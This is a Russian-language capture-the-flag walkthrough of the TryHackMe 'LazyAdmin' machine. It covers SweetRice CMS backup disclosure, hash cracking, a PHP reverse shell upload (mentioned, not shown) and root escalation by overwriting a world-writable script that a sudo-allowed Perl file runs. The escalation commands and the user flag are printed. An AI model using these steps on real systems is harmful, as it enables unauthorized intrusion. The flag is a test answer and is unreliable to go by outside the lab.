# LazyAdmin TryHackMe Easy machine

Попробуем прогнать `SweetRice` через searchsploit:
```
searchsploit sweetrice                                                                                                                              Fri 30 May 2025 07:03:41 PM EEST
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                                                | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                                             | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                                              | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                    | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                           | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                      | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                                  | php/webapps/14184.txt
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Меня заинтересовала строка с `SweetRice 1.5.1 - Backup Disclosure` - возможность просматривать бекапы сервера. 
``` cat /usr/share/exploitdb/exploits/php/webapps/40718.txt


Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip⏎
```

Попробуем зайти на `/inc/mysql_backup`
![](Pasted%20image%2020250530195516.png)
И видим `Not Found`

Попробуем зайти с директории уязвимого сервися (SweetRice) `/content/inc/mysql_backup`
и получаем файл даты базы

![](Pasted%20image%2020250530200040.png)

 скачав дату базы мы видим
 ![](Pasted%20image%2020250530200245.png)
 ![](Pasted%20image%2020250530200339.png)
 видим юзеров и в первом скрине, хэш.
расшифровываем хэщ
![](Pasted%20image%2020250530200427.png)

и получаем самый сложный пароль в вашей жизни..
 теперь настало время входить в админ панель
 у cms админка по as
 в нашем случае /content/as
 ![](Pasted%20image%2020250530201059.png)
 дальше здесь вставляем php revers shell

после входа в юзера www-data
ls /home
и видим юзера itguy 
cat /home/itguy/user.txt
и получаем наш заветный флаг
`THM{63e5bce9271952aad1113b6f1ac28a07}`
дальше самое интересное

# taken rooooot

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl  
```


видим что можем запускать скрипт перла с судо без пароля

Стартовая точка:

- У пользователя www-data есть возможность запускать без пароля команду:
    
    sudo /usr/bin/perl /home/itguy/backup.pl
    
- Содержимое backup.pl:
    
    #!/usr/bin/perl  
    system("sh", "/etc/copy.sh");
    
- Скрипт /etc/copy.sh принадлежит root, но имеет права на запись для всех: -rw-r--rwx
    

Эксплуатация:

1. Подменили содержимое /etc/copy.sh:
```
echo '#!/bin/bash' > /etc/copy.sh
echo '/bin/bash' >> /etc/copy.sh
chmod +x /etc/copy.sh
```
Запустили уязвимый скрипт:
`sudo /usr/bin/perl /home/itguy/backup.pl`

Получили интерактивную bash-сессию от root.
 дальше просто `cat /root/root.txt`
